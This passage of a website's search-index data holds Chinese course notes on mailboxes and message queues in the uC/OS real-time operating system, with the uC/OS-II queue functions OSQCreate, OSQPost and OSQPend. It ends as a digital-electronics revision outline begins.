\u5185\u6838\u79fb\u690d"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.%E9%82%AE%E7%AE%B1%E5%92%8C%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/","text":"uCos\u4e2d\u7684\u90ae\u7bb1\u548c\u6d88\u606f\u961f\u5217 # \u76ee\u5f55 # uCos\u4e2d\u7684\u90ae\u7bb1\u548c\u6d88\u606f\u961f\u5217 \u76ee\u5f55 1. \u80cc\u666f 2. \u76f4\u63a5\u901a\u4fe1\u4e0e\u95f4\u63a5\u901a\u4fe1 3. \u6d88\u606f\u673a\u5236 4. \u6d88\u606f\u961f\u5217 5. ucos-ii\u4e2d\u5b9e\u73b0 5.1. \u4efb\u52a1\u521b\u5efa 5.2. \u53d1\u9001\u6d88\u606f 5.3. \u7b49\u5f85\u6d88\u606f 1. \u80cc\u666f # \u524d\u6bb5\u65f6\u95f4\u8001\u5e08\u4e0a\u8bfe\u8bb2\u5230\u4e86uC/OS\u4e2d\u7684\u90ae\u7bb1\u548c\u6d88\u606f\u961f\u5217\uff0c\u6240\u4ee5\u6211\u60f3\u8981\u7ed3\u5408 \u300a\u03bcC/OS-III\u6e90\u7801\u5206\u6790\u7b14\u8bb0\u300b \u548c\u4e2d\u56fd\u5927\u5b66MOOC-\u7535\u5b50\u79d1\u6280\u5927\u5b66 \u300a\u5d4c\u5165\u5f0f\u7cfb\u7edf\u53ca\u5e94\u7528\u300b PPT\u5199\u4e00\u7bc7\u7b14\u8bb0\u5bf9\u8fd9\u90e8\u5206\u7684\u5185\u5bb9\u8fdb\u884c\u603b\u7ed3\u3002 2. \u76f4\u63a5\u901a\u4fe1\u4e0e\u95f4\u63a5\u901a\u4fe1 # \u76f4\u63a5\u901a\u4fe1\uff1a\u5728\u901a\u4fe1\u8fc7\u7a0b\u4e2d\u53cc\u65b9\u5fc5\u987b\u660e\u786e\u5730\u77e5\u9053(\u547d\u540d)\u5f7c\u6b64\u3002 Send (P\uff0cmessage) \u2013 \u53d1\u9001\u4e00\u4e2a\u6d88\u606f\u5230\u4efb\u52a1P Receive(Q\uff0cmessage) \u2013 \u4ece\u4efb\u52a1Q\u63a5\u6536\u4e00\u4e2a\u6d88\u606f \u95f4\u63a5\u901a\u4fe1\uff1a\u901a\u4fe1\u53cc\u65b9\u4e0d\u9700\u8981\u6307\u51fa\u6d88\u606f\u7684\u6765\u6e90\u6216\u53bb\u5411\uff0c\u800c\u901a\u8fc7\u4e2d\u95f4\u673a \u5236\u6765\u901a\u4fe1 send(A\uff0cmessage) \u2013 \u53d1\u9001\u4e00\u4e2a\u6d88\u606f\u7ed9\u90ae\u7bb1A receive(A\uff0cmessage) \u2013 \u4ece\u90ae\u7bb1A\u63a5\u6536\u4e00\u4e2a\u6d88\u606f 3. \u6d88\u606f\u673a\u5236 # \u6d88\u606f\u961f\u5217\uff1a\u5c5e\u4e8e\u95f4\u63a5\u901a\u4fe1\u65b9\u5f0f \u6d88\u606f\uff1a\u5185\u5b58\u7a7a\u95f4\u4e2d\u4e00\u6bb5\u957f\u5ea6\u53ef\u53d8\u7684\u7f13\u51b2\u533a\uff0c\u5176\u957f\u5ea6\u548c\u5185\u5bb9\u5747\u53ef\u4ee5\u7531\u7528\u6237\u5b9a\u4e49\u548c\u89e3\u91ca\uff0c\u5176 \u5185\u5bb9\u53ef\u4ee5\u662f\u5b9e\u9645\u7684\u6570\u636e\u3001\u6570\u636e\u5757\u7684\u6307\u9488\u6216\u7a7a \u3002 \u4ece\u64cd\u4f5c\u7cfb\u7edf\u89c2\u70b9\u770b\uff0c\u6d88\u606f\u6ca1\u6709\u5b9a\u4e49\u7684\u683c\u5f0f\uff0c\u6240\u6709\u7684\u6d88\u606f\u90fd\u662f\u5b57\u8282\u6d41\uff0c\u6ca1\u6709\u7279\u5b9a\u7684\u542b\u4e49\u3002 \u5e94\u7528\u53ef\u4ee5\u53ea\u628a\u6d88\u606f\u5f53\u6210\u4e00\u4e2a\u6807\u5fd7\uff0c\u8fd9\u65f6\u6d88\u606f\u673a\u5236\u7528\u4e8e\u5b9e\u73b0\u540c\u6b65\u3002 \u6d88\u606f\u673a\u5236\u53ef\u8fdb\u4e00\u6b65\u5206\u4e3a\uff1a \u90ae\u7bb1\u548c\u6d88\u606f\u961f\u5217 \u3002 \u90ae\u7bb1\u4ec5\u80fd\u5b58\u653e\u5355\u6761\u6d88\u606f\uff0c \u6d88\u606f\u961f\u5217\u53ef\u5b58\u653e\u82e5\u5e72\u6d88\u606f \u3002 \u6d88\u606f\u673a\u5236\u53ef \u652f\u6301\u5b9a\u957f\u4e0e\u53ef\u53d8\u957f\u5ea6 \u4e24\u79cd\u6a21\u5f0f\u7684\u6d88\u606f\u3002 4. \u6d88\u606f\u961f\u5217 # \\text{Figure 1. \u6d88\u606f\u961f\u5217\u673a\u5236\u7684\u4e3b\u8981\u6570\u636e\u7ed3\u6784} \u6d88\u606f\u961f\u5217\u63a7\u5236\u5757:\u7ba1\u7406\u6240\u6709\u521b\u5efa\u7684\u6d88\u606f\u961f\u5217\uff0c\u7cfb\u7edf\u8fd0\u884c\u65f6\u52a8\u6001\u5206\u914d\u548c \u56de\u6536\u6d88\u606f\u961f\u5217\u63a7\u5236\u5757\u3002 \u6d88\u606f\u961f\u5217\u7f13\u51b2\u533a:\u5b58\u653e\u8be5\u961f\u5217\u7684\u6d88\u606f\u5185\u5bb9\u3002 \u5982\u4f55\u8fdb\u884c\u6d88\u606f\u7684\u53d1\u9001\u6216\u63a5\u6536? \u5b8c\u6574\u7684\u6d88\u606f\u5185\u5bb9\u62f7\u8d1d or \u4f20\u9012\u6307\u9488 (\u6548\u7387\u9ad8\u3001\u7cfb\u7edf\u6027\u80fd\u597d\u3001\u7a7a\u95f4\u5360\u7528\u5c0f)? \\text{Figure 2. \u6d88\u606f\u961f\u5217\u7684\u72b6\u6001\u56fe} \\text{Figure 3. \u6d88\u606f\u961f\u5217\u7684\u4e3b\u8981\u6570\u636e\u7ed3\u6784} \\text{Figure 4. \u6d88\u606f\u961f\u5217\u7684\u73af\u5f62\u7f13\u51b2} \\text{Figure 5. \u63a5\u6536\u6d88\u606f\u6d41\u7a0b\u56fe} \\text{Figure 6.\u6d88\u606f\u961f\u5217\u7684\u5178\u578b\u5e94\u7528} 5. ucos-ii\u4e2d\u5b9e\u73b0 # 5.1. \u4efb\u52a1\u521b\u5efa # OS_EVENT *OSQCreate (void **start, INT16U size) { #if OS_CRITICAL_METHOD == 3 /* Allocate storage for CPU status register */ OS_CPU_SR cpu_sr; #endif OS_EVENT *pevent; OS_Q *pq; if (OSIntNesting > 0) { /* See if called from ISR ... */ return ((OS_EVENT *)0); /* ... can't CREATE from an ISR */ } OS_ENTER_CRITICAL(); pevent = OSEventFreeList; /* Get next free event control block */ if (OSEventFreeList != (OS_EVENT *)0) { /* See if pool of free ECB pool was empty */ OSEventFreeList = (OS_EVENT *)OSEventFreeList->OSEventPtr; } OS_EXIT_CRITICAL(); if (pevent != (OS_EVENT *)0) { /* See if we have an event control block */ OS_ENTER_CRITICAL(); pq = OSQFreeList; /* Get a free queue control block */ if (pq != (OS_Q *)0) { /* Were we able to get a queue control block ? */ OSQFreeList = OSQFreeList->OSQPtr; /* Yes, Adjust free list pointer to next free*/ OS_EXIT_CRITICAL(); pq->OSQStart = start; /* Initialize the queue */ pq->OSQEnd = &start[size]; pq->OSQIn = start; pq->OSQOut = start; pq->OSQSize = size; pq->OSQEntries = 0; pevent->OSEventType = OS_EVENT_TYPE_Q; pevent->OSEventCnt = 0; pevent->OSEventPtr = pq; OS_EventWaitListInit(pevent); /* Initalize the wait list */ } else { pevent->OSEventPtr = (void *)OSEventFreeList; /* No, Return event control block on error */ OSEventFreeList = pevent; OS_EXIT_CRITICAL(); pevent = (OS_EVENT *)0; } } return (pevent); } 5.2. \u53d1\u9001\u6d88\u606f # INT8U OSQPost (OS_EVENT *pevent, void *msg) { #if OS_CRITICAL_METHOD == 3 /* Allocate storage for CPU status register */ OS_CPU_SR cpu_sr; #endif OS_Q *pq; #if OS_ARG_CHK_EN > 0 if (pevent == (OS_EVENT *)0) { /* Validate 'pevent' */ return (OS_ERR_PEVENT_NULL); } if (msg == (void *)0) { /* Make sure we are not posting a NULL pointer */ return (OS_ERR_POST_NULL_PTR); } if (pevent->OSEventType != OS_EVENT_TYPE_Q) { /* Validate event block type */ return (OS_ERR_EVENT_TYPE); } #endif OS_ENTER_CRITICAL(); if (pevent->OSEventGrp != 0x00) { /* See if any task pending on queue */ OS_EventTaskRdy(pevent, msg, OS_STAT_Q); /* Ready highest priority task waiting on event */ OS_EXIT_CRITICAL(); OS_Sched(); /* Find highest priority task ready to run */ return (OS_NO_ERR); } pq = (OS_Q *)pevent->OSEventPtr; /* Point to queue control block */ if (pq->OSQEntries >= pq->OSQSize) { /* Make sure queue is not full */ OS_EXIT_CRITICAL(); return (OS_Q_FULL); } *pq->OSQIn++ = msg; /* Insert message into queue */ pq->OSQEntries++; /* Update the nbr of entries in the queue */ if (pq->OSQIn == pq->OSQEnd) { /* Wrap IN ptr if we are at end of queue */ pq->OSQIn = pq->OSQStart; } OS_EXIT_CRITICAL(); return (OS_NO_ERR); } 5.3. \u7b49\u5f85\u6d88\u606f # void *OSQPend (OS_EVENT *pevent, INT16U timeout, INT8U *err) { #if OS_CRITICAL_METHOD == 3 /* Allocate storage for CPU status register */ OS_CPU_SR cpu_sr; #endif void *msg; OS_Q *pq; if (OSIntNesting > 0) { /* See if called from ISR ... */ *err = OS_ERR_PEND_ISR; /* ... can't PEND from an ISR */ return ((void *)0); } #if OS_ARG_CHK_EN > 0 if (pevent == (OS_EVENT *)0) { /* Validate 'pevent' */ *err = OS_ERR_PEVENT_NULL; return ((void *)0); } if (pevent->OSEventType != OS_EVENT_TYPE_Q) {/* Validate event block type */ *err = OS_ERR_EVENT_TYPE; return ((void *)0); } #endif OS_ENTER_CRITICAL(); pq = (OS_Q *)pevent->OSEventPtr; /* Point at queue control block */ if (pq->OSQEntries > 0) { /* See if any messages in the queue */ msg = *pq->OSQOut++; /* Yes, extract oldest message from the queue */ pq->OSQEntries--; /* Update the number of entries in the queue */ if (pq->OSQOut == pq->OSQEnd) { /* Wrap OUT pointer if we are at the end of the queue */ pq->OSQOut = pq->OSQStart; } OS_EXIT_CRITICAL(); *err = OS_NO_ERR; return (msg); /* Return message received */ } OSTCBCur->OSTCBStat |= OS_STAT_Q; /* Task will have to pend for a message to be posted */ OSTCBCur->OSTCBDly = timeout; /* Load timeout into TCB */ OS_EventTaskWait(pevent); /* Suspend task until event or timeout occurs */ OS_EXIT_CRITICAL(); OS_Sched(); /* Find next highest priority task ready to run */ OS_ENTER_CRITICAL(); msg = OSTCBCur->OSTCBMsg; if (msg != (void *)0) { /* Did we get a message? */ OSTCBCur->OSTCBMsg = (void *)0; /* Extract message from TCB (Put there by QPost) */ OSTCBCur->OSTCBStat = OS_STAT_RDY; OSTCBCur->OSTCBEventPtr = (OS_EVENT *)0; /* No longer waiting for event */ OS_EXIT_CRITICAL(); *err = OS_NO_ERR; return (msg); /* Return message received */ } OS_EventTO(pevent); /* Timed out */ OS_EXIT_CRITICAL(); *err = OS_TIMEOUT; /* Indicate a timeout occured */ return ((void *)0); /* No message received */ } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"9.\u90ae\u7bb1\u548c\u6d88\u606f\u961f\u5217"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.%E9%82%AE%E7%AE%B1%E5%92%8C%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/#ucos","text":"","title":"uCos\u4e2d\u7684\u90ae\u7bb1\u548c\u6d88\u606f\u961f\u5217"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.%E9%82%AE%E7%AE%B1%E5%92%8C%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/#_1","text":"uCos\u4e2d\u7684\u90ae\u7bb1\u548c\u6d88\u606f\u961f\u5217 \u76ee\u5f55 1. \u80cc\u666f 2. \u76f4\u63a5\u901a\u4fe1\u4e0e\u95f4\u63a5\u901a\u4fe1 3. \u6d88\u606f\u673a\u5236 4. \u6d88\u606f\u961f\u5217 5. ucos-ii\u4e2d\u5b9e\u73b0 5.1. \u4efb\u52a1\u521b\u5efa 5.2. \u53d1\u9001\u6d88\u606f 5.3. \u7b49\u5f85\u6d88\u606f","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.%E9%82%AE%E7%AE%B1%E5%92%8C%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/#1","text":"\u524d\u6bb5\u65f6\u95f4\u8001\u5e08\u4e0a\u8bfe\u8bb2\u5230\u4e86uC/OS\u4e2d\u7684\u90ae\u7bb1\u548c\u6d88\u606f\u961f\u5217\uff0c\u6240\u4ee5\u6211\u60f3\u8981\u7ed3\u5408 \u300a\u03bcC/OS-III\u6e90\u7801\u5206\u6790\u7b14\u8bb0\u300b \u548c\u4e2d\u56fd\u5927\u5b66MOOC-\u7535\u5b50\u79d1\u6280\u5927\u5b66 \u300a\u5d4c\u5165\u5f0f\u7cfb\u7edf\u53ca\u5e94\u7528\u300b PPT\u5199\u4e00\u7bc7\u7b14\u8bb0\u5bf9\u8fd9\u90e8\u5206\u7684\u5185\u5bb9\u8fdb\u884c\u603b\u7ed3\u3002","title":"1. \u80cc\u666f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.%E9%82%AE%E7%AE%B1%E5%92%8C%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/#2","text":"\u76f4\u63a5\u901a\u4fe1\uff1a\u5728\u901a\u4fe1\u8fc7\u7a0b\u4e2d\u53cc\u65b9\u5fc5\u987b\u660e\u786e\u5730\u77e5\u9053(\u547d\u540d)\u5f7c\u6b64\u3002 Send (P\uff0cmessage) \u2013 \u53d1\u9001\u4e00\u4e2a\u6d88\u606f\u5230\u4efb\u52a1P Receive(Q\uff0cmessage) \u2013 \u4ece\u4efb\u52a1Q\u63a5\u6536\u4e00\u4e2a\u6d88\u606f \u95f4\u63a5\u901a\u4fe1\uff1a\u901a\u4fe1\u53cc\u65b9\u4e0d\u9700\u8981\u6307\u51fa\u6d88\u606f\u7684\u6765\u6e90\u6216\u53bb\u5411\uff0c\u800c\u901a\u8fc7\u4e2d\u95f4\u673a \u5236\u6765\u901a\u4fe1 send(A\uff0cmessage) \u2013 \u53d1\u9001\u4e00\u4e2a\u6d88\u606f\u7ed9\u90ae\u7bb1A receive(A\uff0cmessage) \u2013 \u4ece\u90ae\u7bb1A\u63a5\u6536\u4e00\u4e2a\u6d88\u606f","title":"2. \u76f4\u63a5\u901a\u4fe1\u4e0e\u95f4\u63a5\u901a\u4fe1"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.%E9%82%AE%E7%AE%B1%E5%92%8C%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/#3","text":"\u6d88\u606f\u961f\u5217\uff1a\u5c5e\u4e8e\u95f4\u63a5\u901a\u4fe1\u65b9\u5f0f \u6d88\u606f\uff1a\u5185\u5b58\u7a7a\u95f4\u4e2d\u4e00\u6bb5\u957f\u5ea6\u53ef\u53d8\u7684\u7f13\u51b2\u533a\uff0c\u5176\u957f\u5ea6\u548c\u5185\u5bb9\u5747\u53ef\u4ee5\u7531\u7528\u6237\u5b9a\u4e49\u548c\u89e3\u91ca\uff0c\u5176 \u5185\u5bb9\u53ef\u4ee5\u662f\u5b9e\u9645\u7684\u6570\u636e\u3001\u6570\u636e\u5757\u7684\u6307\u9488\u6216\u7a7a \u3002 \u4ece\u64cd\u4f5c\u7cfb\u7edf\u89c2\u70b9\u770b\uff0c\u6d88\u606f\u6ca1\u6709\u5b9a\u4e49\u7684\u683c\u5f0f\uff0c\u6240\u6709\u7684\u6d88\u606f\u90fd\u662f\u5b57\u8282\u6d41\uff0c\u6ca1\u6709\u7279\u5b9a\u7684\u542b\u4e49\u3002 \u5e94\u7528\u53ef\u4ee5\u53ea\u628a\u6d88\u606f\u5f53\u6210\u4e00\u4e2a\u6807\u5fd7\uff0c\u8fd9\u65f6\u6d88\u606f\u673a\u5236\u7528\u4e8e\u5b9e\u73b0\u540c\u6b65\u3002 \u6d88\u606f\u673a\u5236\u53ef\u8fdb\u4e00\u6b65\u5206\u4e3a\uff1a \u90ae\u7bb1\u548c\u6d88\u606f\u961f\u5217 \u3002 \u90ae\u7bb1\u4ec5\u80fd\u5b58\u653e\u5355\u6761\u6d88\u606f\uff0c \u6d88\u606f\u961f\u5217\u53ef\u5b58\u653e\u82e5\u5e72\u6d88\u606f \u3002 \u6d88\u606f\u673a\u5236\u53ef \u652f\u6301\u5b9a\u957f\u4e0e\u53ef\u53d8\u957f\u5ea6 \u4e24\u79cd\u6a21\u5f0f\u7684\u6d88\u606f\u3002","title":"3. \u6d88\u606f\u673a\u5236"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.%E9%82%AE%E7%AE%B1%E5%92%8C%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/#4","text":"\\text{Figure 1. \u6d88\u606f\u961f\u5217\u673a\u5236\u7684\u4e3b\u8981\u6570\u636e\u7ed3\u6784} \u6d88\u606f\u961f\u5217\u63a7\u5236\u5757:\u7ba1\u7406\u6240\u6709\u521b\u5efa\u7684\u6d88\u606f\u961f\u5217\uff0c\u7cfb\u7edf\u8fd0\u884c\u65f6\u52a8\u6001\u5206\u914d\u548c \u56de\u6536\u6d88\u606f\u961f\u5217\u63a7\u5236\u5757\u3002 \u6d88\u606f\u961f\u5217\u7f13\u51b2\u533a:\u5b58\u653e\u8be5\u961f\u5217\u7684\u6d88\u606f\u5185\u5bb9\u3002 \u5982\u4f55\u8fdb\u884c\u6d88\u606f\u7684\u53d1\u9001\u6216\u63a5\u6536? \u5b8c\u6574\u7684\u6d88\u606f\u5185\u5bb9\u62f7\u8d1d or \u4f20\u9012\u6307\u9488 (\u6548\u7387\u9ad8\u3001\u7cfb\u7edf\u6027\u80fd\u597d\u3001\u7a7a\u95f4\u5360\u7528\u5c0f)? \\text{Figure 2. \u6d88\u606f\u961f\u5217\u7684\u72b6\u6001\u56fe} \\text{Figure 3. \u6d88\u606f\u961f\u5217\u7684\u4e3b\u8981\u6570\u636e\u7ed3\u6784} \\text{Figure 4. \u6d88\u606f\u961f\u5217\u7684\u73af\u5f62\u7f13\u51b2} \\text{Figure 5. \u63a5\u6536\u6d88\u606f\u6d41\u7a0b\u56fe} \\text{Figure 6.\u6d88\u606f\u961f\u5217\u7684\u5178\u578b\u5e94\u7528}","title":"4. \u6d88\u606f\u961f\u5217"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.%E9%82%AE%E7%AE%B1%E5%92%8C%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/#5-ucos-ii","text":"","title":"5. ucos-ii\u4e2d\u5b9e\u73b0"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.%E9%82%AE%E7%AE%B1%E5%92%8C%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/#51","text":"OS_EVENT *OSQCreate (void **start, INT16U size) { #if OS_CRITICAL_METHOD == 3 /* Allocate storage for CPU status register */ OS_CPU_SR cpu_sr; #endif OS_EVENT *pevent; OS_Q *pq; if (OSIntNesting > 0) { /* See if called from ISR ... */ return ((OS_EVENT *)0); /* ... can't CREATE from an ISR */ } OS_ENTER_CRITICAL(); pevent = OSEventFreeList; /* Get next free event control block */ if (OSEventFreeList != (OS_EVENT *)0) { /* See if pool of free ECB pool was empty */ OSEventFreeList = (OS_EVENT *)OSEventFreeList->OSEventPtr; } OS_EXIT_CRITICAL(); if (pevent != (OS_EVENT *)0) { /* See if we have an event control block */ OS_ENTER_CRITICAL(); pq = OSQFreeList; /* Get a free queue control block */ if (pq != (OS_Q *)0) { /* Were we able to get a queue control block ? */ OSQFreeList = OSQFreeList->OSQPtr; /* Yes, Adjust free list pointer to next free*/ OS_EXIT_CRITICAL(); pq->OSQStart = start; /* Initialize the queue */ pq->OSQEnd = &start[size]; pq->OSQIn = start; pq->OSQOut = start; pq->OSQSize = size; pq->OSQEntries = 0; pevent->OSEventType = OS_EVENT_TYPE_Q; pevent->OSEventCnt = 0; pevent->OSEventPtr = pq; OS_EventWaitListInit(pevent); /* Initalize the wait list */ } else { pevent->OSEventPtr = (void *)OSEventFreeList; /* No, Return event control block on error */ OSEventFreeList = pevent; OS_EXIT_CRITICAL(); pevent = (OS_EVENT *)0; } } return (pevent); }","title":"5.1. \u4efb\u52a1\u521b\u5efa"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.%E9%82%AE%E7%AE%B1%E5%92%8C%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/#52","text":"INT8U OSQPost (OS_EVENT *pevent, void *msg) { #if OS_CRITICAL_METHOD == 3 /* Allocate storage for CPU status register */ OS_CPU_SR cpu_sr; #endif OS_Q *pq; #if OS_ARG_CHK_EN > 0 if (pevent == (OS_EVENT *)0) { /* Validate 'pevent' */ return (OS_ERR_PEVENT_NULL); } if (msg == (void *)0) { /* Make sure we are not posting a NULL pointer */ return (OS_ERR_POST_NULL_PTR); } if (pevent->OSEventType != OS_EVENT_TYPE_Q) { /* Validate event block type */ return (OS_ERR_EVENT_TYPE); } #endif OS_ENTER_CRITICAL(); if (pevent->OSEventGrp != 0x00) { /* See if any task pending on queue */ OS_EventTaskRdy(pevent, msg, OS_STAT_Q); /* Ready highest priority task waiting on event */ OS_EXIT_CRITICAL(); OS_Sched(); /* Find highest priority task ready to run */ return (OS_NO_ERR); } pq = (OS_Q *)pevent->OSEventPtr; /* Point to queue control block */ if (pq->OSQEntries >= pq->OSQSize) { /* Make sure queue is not full */ OS_EXIT_CRITICAL(); return (OS_Q_FULL); } *pq->OSQIn++ = msg; /* Insert message into queue */ pq->OSQEntries++; /* Update the nbr of entries in the queue */ if (pq->OSQIn == pq->OSQEnd) { /* Wrap IN ptr if we are at end of queue */ pq->OSQIn = pq->OSQStart; } OS_EXIT_CRITICAL(); return (OS_NO_ERR); }","title":"5.2. \u53d1\u9001\u6d88\u606f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.%E9%82%AE%E7%AE%B1%E5%92%8C%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/#53","text":"void *OSQPend (OS_EVENT *pevent, INT16U timeout, INT8U *err) { #if OS_CRITICAL_METHOD == 3 /* Allocate storage for CPU status register */ OS_CPU_SR cpu_sr; #endif void *msg; OS_Q *pq; if (OSIntNesting > 0) { /* See if called from ISR ... */ *err = OS_ERR_PEND_ISR; /* ... can't PEND from an ISR */ return ((void *)0); } #if OS_ARG_CHK_EN > 0 if (pevent == (OS_EVENT *)0) { /* Validate 'pevent' */ *err = OS_ERR_PEVENT_NULL; return ((void *)0); } if (pevent->OSEventType != OS_EVENT_TYPE_Q) {/* Validate event block type */ *err = OS_ERR_EVENT_TYPE; return ((void *)0); } #endif OS_ENTER_CRITICAL(); pq = (OS_Q *)pevent->OSEventPtr; /* Point at queue control block */ if (pq->OSQEntries > 0) { /* See if any messages in the queue */ msg = *pq->OSQOut++; /* Yes, extract oldest message from the queue */ pq->OSQEntries--; /* Update the number of entries in the queue */ if (pq->OSQOut == pq->OSQEnd) { /* Wrap OUT pointer if we are at the end of the queue */ pq->OSQOut = pq->OSQStart; } OS_EXIT_CRITICAL(); *err = OS_NO_ERR; return (msg); /* Return message received */ } OSTCBCur->OSTCBStat |= OS_STAT_Q; /* Task will have to pend for a message to be posted */ OSTCBCur->OSTCBDly = timeout; /* Load timeout into TCB */ OS_EventTaskWait(pevent); /* Suspend task until event or timeout occurs */ OS_EXIT_CRITICAL(); OS_Sched(); /* Find next highest priority task ready to run */ OS_ENTER_CRITICAL(); msg = OSTCBCur->OSTCBMsg; if (msg != (void *)0) { /* Did we get a message? */ OSTCBCur->OSTCBMsg = (void *)0; /* Extract message from TCB (Put there by QPost) */ OSTCBCur->OSTCBStat = OS_STAT_RDY; OSTCBCur->OSTCBEventPtr = (OS_EVENT *)0; /* No longer waiting for event */ OS_EXIT_CRITICAL(); *err = OS_NO_ERR; return (msg); /* Return message received */ } OS_EventTO(pevent); /* Timed out */ OS_EXIT_CRITICAL(); *err = OS_TIMEOUT; /* Indicate a timeout occured */ return ((void *)0); /* No message received */ } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"5.3. \u7b49\u5f85\u6d88\u606f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%97%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/1.%E5%A4%8D%E4%B9%A0%E5%A4%A7%E7%BA%B2/","text":"\u6570\u5b57\u7535\u5b50\u6280\u672f\u590d\u4e60\u5927\u7eb2 # \u76ee\u5f55 # \u6570\u5b57\u7535\u5b50\u6280\u672f\u590d\u4e60\u5927\u7eb2 \u76ee\u5f55 1. \u6570\u5b57\u8fd0\u7b97\u57fa\u7840 1.1. \u8fdb\u5236 1.2. \u7f16\u7801 1.3. \u53cd\u51fd\u6570\u3001\u5bf9\u5076\u5f0f\u7684\u5b9a\u4e49\u53ca\u6c42\u6cd5 1.4. \u4ee3\u6570\u6cd5\u5316\u7b80 1.5. \u5361\u8bfa\u56fe\u5316\u7b80 1.6. \u95e8\u7535\u8def\u53ca\u7b26\u53f7\u3001\u903b\u8f91\u5173\u7cfb 2. \u7ec4\u5408\u903b\u8f91\u7535\u8def 2.1. \u5206\u6790 2.2. \u8bbe\u8ba1 2.3. \u4e2d\u89c4\u6a21\u96c6\u6210\u7535\u8def\u7684\u5e94\u7528 2.3.1. \u7f16\u7801\u5668 2.3.2. \u8bd1\u7801\u5668 2.3.3. \u6570\u636e\u9009\u62e9\u5668 2.3.4. \u4f7f\u80fd\u7aef\uff08\u7247\u9009\u7aef\uff09\u7684\u7528\u9014 3. \u65f6\u5e8f\u903b\u8f91\u7535\u8def 3.1. \u9501\u5b58\u5668\u3001\u89e6\u53d1\u5668 3.2. \u540c\u6b65\u65f6\u5e8f\u903b\u8f91\u7535\u8def\u5206\u6790 3.3. \u5f02\u6b65\u65f6\u5e8f\u903b\u8f91\u7535\u8def\u5206\u6790 3.4. \u540c\u6b65\u65f6\u5e8f\u903b\u8f91\u7535\u8def\u8bbe\u8ba1 3.5. 74161\u5e94\u7528 4. \u8109\u51b2\u6ce2\u5f62\u7684\u4ea7\u751f\u4e0e\u53d8\u6362 4.1. \u5355\u7a33\u6001\u89e6\u53d1\u5668 4.2. \u65bd\u5bc6\u7279\u89e6\u53d1\u5668 4.3. \u591a\u8c10\u632f\u8361\u5668 4.4. 555\u5b9a\u65f6\u5668\u53ca\u5176\u5e94\u7528 1. \u6570\u5b57\u8fd0\u7b97\u57fa\u7840 # 1.1. \u8fdb\u5236 # 2\u30018\u300116\u300110\u8fdb\u5236\u53ca\u76f8\u4e92\u8f6c\u6362\u3002 1.2. \u7f16\u7801 # (\\cdots)_{8421BCD} , (\\cdots)_{5421BCD} , (\\cdots)_{2421 BCD} \u5341\u8fdb\u5236\u6570 8421\u7801 5421\u7801 2421\u7801 \u4f593\u7801 \u4f593\u5faa\u73af\u7801 4\u4f4d\u5178\u578b\u683c\u96f7\u7801 0 0000 0000 0000 0011 0010 0000 1 0001 0001 0001 0100 0110 0001 2 0010 0010 0010 0101 0111 0011 3 0011 0011 0011 0110 0101 0010 4 0100 0100 0100 0111 0100 0110 5 0101 1000 1011 1000 1100 0111 6 0110 1001 